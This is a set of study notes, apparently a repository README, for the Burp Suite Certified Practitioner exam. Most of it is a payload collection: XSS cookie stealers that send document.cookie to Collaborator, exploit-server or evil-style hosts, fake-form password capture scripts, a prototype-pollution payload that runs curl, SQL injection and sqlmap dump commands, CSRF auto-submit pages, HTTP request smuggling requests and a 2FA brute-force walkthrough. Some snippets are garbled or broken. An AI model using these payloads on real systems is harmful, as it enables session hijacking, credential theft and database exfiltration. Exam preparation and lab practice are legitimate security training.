# BSCP_Notes
Notes for Burp Suite Certified Practitioner

- The repository is for learning purpose only
- The payloads and attack patterns defined here should only be used in ethical way
- Make sure you use these notes as a guide only
- Try to make your own customized notes
- There are 4 xmind files which consist of exploit techniques, payloads, tips techniques for cracking the exam:
  - Advance Topics
  - Server-Side Vulnerabilities
  - Client-Side Vulnerabilities
  - Tools and payloads for the exam

## Authentication Bypassing

### 2FA Authentication bypass by relying on a single parameter to send the 2FA code.

With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the POST /login2 request, the verify parameter is used to determine which user's account is being accessed.
    Log out of your account.
    Send the GET /login2 request to Burp Repeater. Change the value of the verify parameter to carlos and send the request. This ensures that a temporary 2FA code is generated for Carlos.
    Go to the login page and enter your username and password. Then, submit an invalid 2FA code.
    Send the POST /login2 request to Burp Intruder.
    In Burp Intruder, set the verify parameter to carlos and add a payload position to the mfa-code parameter. Brute-force the verification code.
    Load the 302 response in the browser.
    Click My account to solve the lab.


## XSS Paylodas for stealing cookies

### Exploits for stealing cookie via XSS
If you find these exploits as applicable, make sure to try with both:
- Exploit server
- COLLABORATOR  

### Using fetch method and defining the POST Method

`<script>
fetch('https://burpcollaborator.net', {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>`

### Using fetch method

`<script>
fetch('https://collaborator.net/?x='+document.cookie);
</script>`

### XSS Cookie Stealer payloads using JavaScript

`JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie`

### Reflected XSS into HTML context with nothing encoded in search.

`<script>document.location='https://COLLABORATOR.com?c='+document.cookie</script>`

### Reflected DOM XSS, into JSON data that is processed by eval().

`\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//`

### JavaScript Template literals are enclosed by backtick ( \` ) characters instead of double or single quotes.

`${document.location='https://tvsw9dim0doynnpscx9mgtq67xdo1jp8.oastify.com/?cookies='+document.cookie;}`

### AngularJS DOM XSS Attack constructor payloads

`{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}``

### Web Cache Parameter cloaking - script /js/geolocate.js, executing the callback function setCountryCookie()

`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//`

Or something like this:

`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=fetch('https://fm5j9cc16vel2tzyiahicza4fvlm9db10.oastify.com/?secertcookie='+document.cookie)`
### More Cross-Site Scripting (XSS) example cookie stealer payloads.

`<script>
document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
</script>`

### HTML  Tag, with invalid Image source, with escape sequence from source code calling window.location for the **LastViewedProduct cookie.

`&'><img src=1 onerror=print()>`
`&'><img src=x onerror=this.src="https://exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/?ex="+document.cookie>`
`<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>`

### Document.location returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.

```
document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;
document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
Document.write

/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script>
<script>
    document.location=""http://stock.lab.web-security-academy.net/?productId=4
            <script>
                    var req = new XMLHttpRequest();
                    req.onload = reqListener;
                    req.open('get','https://lab.web-security-academy.net/accountDetails',true);
                    req.withCredentials = true;
                    req.send();
                    function reqListener() {
                            location='https://exploit.web-security-academy.net/log?key='%2bthis.responseText;
                    };
            %3c/script>
            &storeId=1""
</script>

<script>
fetch(‘https://burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
<script>
  fetch('https://COLLABORATOR.com', {
  method: 'POST',
  mode: 'no-cors',
  body:'PeanutButterCookies='+document.cookie
  });
</script>
x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cookie; //
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

```

### OSCP Offsec PWK hand book cookie stealer example

`<script>new Image().src="http://Collaborator.COM/cool.jpg?output="+document.cookie;</script>`

### Alt Cookie Stealer

```
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
<script>
fetch('https://BURP-COLLABORATOR', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

### Steal Password / Cookie Stealer ::::

#### XMLHttpRequest

```
<input name=username id=username>
<input type=password name=password id=password onhcange="CaptureFunction()">
<script>
function CaptureFunction()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit.com/?username=" + user + "&password=" + pass, true);
xhr.send();
}
</script>
```

#### FETCH API

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### DATA EXFILTRATION / COOKIE STEALER ::::

```
  </textarea><script>fetch('http://exploit.evil?cookie=' + btoa(document.cookie) );</script>
<script>document.write('<img src="http://evil.net/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
<script>
document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
</script>
<script>document.write('<img src="https://EXPLOIT.net/?c='%2bdocument.cookie%2b'" />');</script>
```

### IFRAMEs

```
<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
    "type": "load-channel",
    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
}), "*");'>
```

### Javascript set test cookie in current browser session with no HttpOnly flag to allow proof of concept cookie stealer.

`ocument.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";`

### Prompt Validation payload, does not steal cookie or send it to exploit server.

`<img src=x onerror=prompt(1)>`

## Remote code execution via server-side prototype pollution

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```
## SQL Injection

### SQL Injection guessing the number of columns

Using order by, start by 1 and then keep on adding until you can an error, example for oracle based on input:
`'ORDER+BY+1--`

If order by does not work send null column names or random names, second example is work oracle as dual is a default table in oracle, modify the query based on the db type:
`'UNION+SELECT+NULL,NULL--`
`'UNION+SELECT+'cc','acc'+FROM+dual--`

### Getting table names

## In oracle based on number of columns getting table names
`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`

## In orables based on table names and number of columns getting column names
`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_QXLDOX'--`

## In Oracle based on number of columsn retrieving column data
`'+UNION+SELECT+PASSWORD_XWPKPI,USERNAME_QCONIL+FROM+USERS_QXLDOX--`

### SQLMAP workflow

In the dev Tools, copy the request you want to attack as curl and then paste it as the payloads like:

```
sqlmap -u '<copied data>'  -p <parameter you want to attack> --batch
```

Other useful commands to follow after getting some basic info, this flows from getting the database information, then getting table names, etc.
`--flush-session --dbms postgresql --technique E --level 5`

and now modify the command to dump out dbms: 
 `--dbms postgresql --technique E --level 5 --dbs`

  Now get the tables about the database: 

`--dbms postgresql --technique E --level 5 -D public --tables`

Now retrieve info about the users:
`--dbms postgresql --technique E --level 5 -D public --T users --dump`

## CSRF

### CSRF normal payload with parameters set

`<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Example</title>
</head>
<body>
    <h1>CSRF Attack Page</h1>
    <form id="csrfForm" action="https://vulnerable-website.com/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="to_account" value="attacker_account">
        <input type="hidden" name="_csrf" value="malicious_csrf_token">
    </form>
    <script>
        // Automatically submit the form when the page loads
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>`

### CSRF with header payload using xhr post request

`<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Example</title>
</head>
<body>
    <h1>CSRF Attack Page</h1>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://vulnerable-website.com/transfer", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.setRequestHeader("X-Custom-Header", "<possible XSS attack vector>"); // Custom header set by attacker
        xhr.send("amount=1000&to_account=attacker_account&_csrf=malicious_csrf_token");
    </script>
</body>`

### CSRF with header payload using xhr get request

`<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Example</title>
</head>
<body>
    <h1>CSRF Attack Page</h1>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://vulnerable-website.com/transfer?amount=1000&to_account=attacker_account&_csrf=malicious_csrf_token", true);
        xhr.setRequestHeader("X-Custom-Header", "custom_value"); // Custom header set by attacker
        xhr.send();
    </script>
</body>
</html>`


## Exam Payloads that you might have missed

There were http request smuggling findings plus xss through UA, something like this and then practicing this should have been useful

```
POST / HTTP/1.1
Host: 0a0100e303b540ff81ae1b90002500df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 225

0

GET /post?postId=2 HTTP/1.1
User-Agent: 6"/><script>fetch('https://0lm48xbm5gd61eyjhvg3bk9pegk78y3ms.oastify.com/?x='+document.cookie);</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

## CORS

### CORS Attack with XSS and trusted SUBDOMAIN

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...

The application responds with:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true

In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. there can be a possibility that the trsuted domain is itself vulnerable to xss, which can be used for XSS.
Observe that the productID parameter is vulnerable to XSS.

In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID:
```
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
Example: https://portswigger.net/web-security/cors/lab-breaking-https-attack


# HTTP Request Smuggling Testing Guide

This guide provides a comprehensive flow for testing various types of HTTP request smuggling vulnerabilities, including both HTTP/1.1 and HTTP/2 scenarios.

## Flow Chart for Testing HTTP Request Smuggling

### 1. Start

### 2. Check for HTTP Request Smuggling Vulnerability
- **Action**: Identify potential vulnerability to HTTP request smuggling.
- **Tools**: Burp Suite, manual HTTP request crafting.
- **Payloads**:
  - Example 1:
```
    plaintext
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 44
    Transfer-Encoding: chunked

    0

    GET / HTTP/1.1
    Host: vulnerable-website.com
```
  - Example 2:
```
    plaintext
    GET / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 12

    GET /malicious HTTP/1.1
    Host: vulnerable-website.com
```

### 3. Identify HTTP Version Used
- **Action**: Determine if the server is using HTTP/1.1 or HTTP/2.
- **Tools**: Burp Suite, Wireshark, browser developer tools.
- **Payloads**:
  - Check the server response headers to confirm the HTTP version.
  - Example 1 (HTTP/1.1):
```
    plaintext
    GET / HTTP/1.1
    Host: vulnerable-website.com
```
  - Example 2 (HTTP/2):
```
    plaintext
    GET / HTTP/2.0
    Host: vulnerable-website.com
```

### 4. HTTP/2 Downgrade Test
- **Action**: Test if downgrading to HTTP/1.1 is possible when the server supports HTTP/2.
- **Payloads**: Modify request headers to force HTTP/1.1 usage.
  - Example:
```
    plaintext
    GET / HTTP/1.1
    Host: vulnerable-website.com
```

### 5. Test for HTTP/1.1 Smuggling Types

#### TE.CL (Transfer-Encoding: chunked and Content-Length)
```
plaintext
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

GET /malicious HTTP/1.1
Host: vulnerable-website.com
```
Expected Behavior:

The server may process the GET /malicious request separately after processing the initial POST request.

### CL.TE (Content-Length and Transfer-Encoding: chunked)

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /malicious HTTP/1.1
Host: vulnerable-website.com
```

Expected Behavior:

The server may interpret the content length and transfer encoding inconsistently, leading to request smuggling.

### TE.TE (Transfer-Encoding: chunked twice)

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Transfer-Encoding: chunked

0

GET /malicious HTTP/1.1
Host: vulnerable-website.com
```
Expected Behavior:

The server may incorrectly handle the repeated transfer encoding headers, resulting in request smuggling.

### 6. Test for HTTP/2 Smuggling Types

### H2.CL (HTTP/2 with Content-Length)

```
POST /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
Content-Length: 13

GET /malicious HTTP/2.0
Host: attacker-website.com
```

Expected Behavior:

The server may misinterpret the Content-Length header and process the injected request separately.

### H2.TE (HTTP/2 with Transfer-Encoding)

```
POST /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
Transfer-Encoding: chunked

0

GET /malicious HTTP/2.0
Host: attacker-website.com
```
Expected Behavior:

The server may handle the Transfer-Encoding header incorrectly, leading to request smuggling.

### 7. Test for HTTP/2 Request Smuggling via CRLF Injection

```
POST /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
Content-Length: 13
X-Injected-Header: value\r\nGET / HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n

malicious=data
```
### 8. Test for HTTP/2 Request Splitting via CRLF Injection

```
GET /vulnerable-endpoint HTTP/2.0
Host: vulnerable-website.com
User-Agent: legitimate-user-agent
X-Injected-Header: value\r\nGET /malicious HTTP/2.0\r\nHost: attacker-website.com\r\n\r\n
```

Expected Behavior:

The server may split the request and process the injected GET /malicious HTTP/2.0 as a separate request.

### 9. Observe Server Responses

Monitor for signs of smuggling:
Split requests
Delayed responses
Unexpected responses using Burp Suite, server logs, and HTTP response analysis.

### 10. Confirm Exploitable Vulnerabilities

Verify if the observed behavior can be exploited using various payloads to determine the extent of the vulnerability.
